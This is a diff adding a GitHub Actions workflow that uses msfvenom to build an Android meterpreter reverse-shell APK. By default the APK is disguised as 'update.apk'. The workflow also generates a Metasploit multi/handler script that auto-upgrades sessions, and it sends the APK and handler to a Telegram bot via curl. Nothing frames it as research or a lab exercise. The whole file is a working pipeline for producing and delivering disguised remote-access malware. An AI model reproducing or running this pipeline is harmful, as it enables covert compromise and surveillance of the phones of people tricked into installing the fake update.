@@ -1,1 +1,111 @@
+name: Build MSF Payload
 
+on:
+  workflow_dispatch:
+    inputs:
+      lhost:
+        description: "LHOST — public IP/domain your handler listens on"
+        required: true
+      lport:
+        description: "LPORT"
+        required: true
+        default: "4444"
+      payload:
+        description: "msfvenom payload"
+        required: true
+        default: "android/meterpreter/reverse_tcp"
+      filename:
+        description: "Output APK name (disguise)"
+        required: true
+        default: "update.apk"
+
+env:
+  IMAGE: "metasploitframework/metasploit-framework:latest"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Resolve parameters
+        id: p
+        run: |
+          LHOST="${{ github.event.inputs.lhost || secrets.LHOST }}"
+          LPORT="${{ github.event.inputs.lport || secrets.LPORT }}"
+          PAYLOAD="${{ github.event.inputs.payload || 'android/meterpreter/reverse_tcp' }}"
+          FNAME="${{ github.event.inputs.filename || 'update.apk' }}"
+          [ -z "$LHOST" ] && { echo "LHOST missing"; exit 1; }
+          [ -z "$LPORT" ] && LPORT=4444
+          echo "lhost=$LHOST"   >> "$GITHUB_OUTPUT"
+          echo "lport=$LPORT"   >> "$GITHUB_OUTPUT"
+          echo "payload=$PAYLOAD" >> "$GITHUB_OUTPUT"
+          echo "fname=$FNAME"   >> "$GITHUB_OUTPUT"
+
+      - name: Pull Metasploit image
+        run: docker pull "$IMAGE"
+
+      - name: Build payload
+        run: |
+          mkdir -p out
+          docker run --rm -v "$PWD/out:/work" "$IMAGE" \
+            ./msfvenom \
+              -p "${{ steps.p.outputs.payload }}" \
+              LHOST="${{ steps.p.outputs.lhost }}" \
+              LPORT="${{ steps.p.outputs.lport }}" \
+              --platform android \
+              -a dalvik \
+              -o "/work/${{ steps.p.outputs.fname }}"
+          ls -lh out/
+
+      - name: Verify APK
+        run: |
+          APK="out/${{ steps.p.outputs.fname }}"
+          test -s "$APK" || { echo "APK empty"; exit 1; }
+          unzip -l "$APK" | grep -q AndroidManifest.xml || { echo "Not a valid APK"; exit 1; }
+          echo "APK OK: $(du -h "$APK" | cut -f1)"
+
+      - name: Build handler rc
+        run: |
+          cat > "out/handler-${{ steps.p.outputs.lport }}.rc" <<EOF
+          use multi/handler
+          set PAYLOAD ${{ steps.p.outputs.payload }}
+          set LHOST ${{ steps.p.outputs.lhost }}
+          set LPORT ${{ steps.p.outputs.lport }}
+          set ExitOnSession false
+          set AutoRunScript post/multi/manage/shell_to_meterpreter
+          exploit -j
+          EOF
+          cat "out/handler-${{ steps.p.outputs.lport }}.rc"
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: msf-payload
+          path: out/
+          retention-days: 7
+
+      - name: Send to Telegram
+        env:
+          TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          APK="out/${{ steps.p.outputs.fname }}"
+          RC="out/handler-${{ steps.p.outputs.lport }}.rc"
+          CAPTION=$(printf 'APK ready\npayload: %s\nLHOST: %s\nLPORT: %s\nsize: %s' \
+            "${{ steps.p.outputs.payload }}" "${{ steps.p.outputs.lhost }}" \
+            "${{ steps.p.outputs.lport }}" "$(du -h "$APK" | cut -f1)")
+
+          curl -sS --fail-with-body \
+            -F "chat_id=${TG_CHAT}" \
+            -F "caption=${CAPTION}" \
+            -F "document=@${APK};type=application/vnd.android.package-archive" \
+            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
+
+          curl -sS --fail-with-body \
+            -F "chat_id=${TG_CHAT}" \
+            -F "document=@${RC}" \
+            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument"
